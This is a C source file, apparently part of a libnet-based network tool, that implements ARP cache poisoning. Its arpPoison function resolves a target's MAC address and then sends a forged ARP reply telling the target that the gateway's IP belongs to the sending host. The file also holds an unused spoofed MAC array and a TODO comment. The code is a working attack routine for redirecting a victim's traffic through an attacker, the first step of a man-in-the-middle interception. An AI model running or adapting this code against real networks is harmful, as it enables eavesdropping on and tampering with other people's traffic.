#include "arp.h"


int arpPoison(char* ipTarget, char* ipGateway, uint8_t* targetHwAddr){
    // Lookup ipTarget's HWAddr..
    if ( getMacAddress(ipTarget, targetHwAddr) != 0)
        return 1;

    uint8_t hwspoof[] = {0xca,0xfe,0x0,0xba,0xaa,0xbe};

   // TODO replace enet_dst with lookup value
    sendArp(ARPOP_REPLY, getIpInt(ipGateway), Settings.hostHwAddr, getIpInt(ipTarget), targetHwAddr);
    return 0;
}

void sendArp(int type, uint32_t ipsrc, uint8_t* hwsrc, uint32_t ipdst, uint8_t* hwdst){
    libnet_ptag_t t;
    libnet_t* l = Settings.arpMachine;
    int c;
    uint8_t *packet;
    uint32_t packet_s;

    t = libnet_build_arp(
            ARPHRD_ETHER,   /* hardware addr */
            ETHERTYPE_IP,   /* protocol addr */
            6,              /* hardware addr size */
            4,              /* protocol addr size */
            type,    /* operation type */
            hwsrc,   /* sender hardware addr */
            (uint8_t *)&ipsrc,  /* sender protocol addr */
            hwdst,   /* target hardware addr */
            (uint8_t *)&ipdst,  /* target protocol addr */
            NULL,           /* payload */
            0,              /* payload size */
            l,              /* libnet context */
            0);             /* libnet id */
    if (t == -1){
        fprintf(stderr, "Can't build ARP header: %s\n", libnet_geterror(l));
        return;
    }
    t = libnet_autobuild_ethernet(
            hwdst,           /* ethernet destination */
            ETHERTYPE_ARP,      /* protocol type */
            l);                 /* libnet handle */
    if (t == -1){
        fprintf(stderr, "Can't build ethernet header: %s\n",
                libnet_geterror(l));
        return;
    }


    if (libnet_adv_cull_packet(l, &packet, &packet_s) == -1){
        fprintf(stderr, "%s", libnet_geterror(l));
    }
    else{
        fprintf(stdout, "packet size: %d\n", packet_s);
        libnet_adv_free_packet(l, packet);
    }

    c = libnet_write(l);
    if (c == -1){
        fprintf(stderr, "Write error: %s\n", libnet_geterror(l));
    }
    else{
        fprintf(stdout, "Wrote %d byte ARP packet\n", c);
    }


}
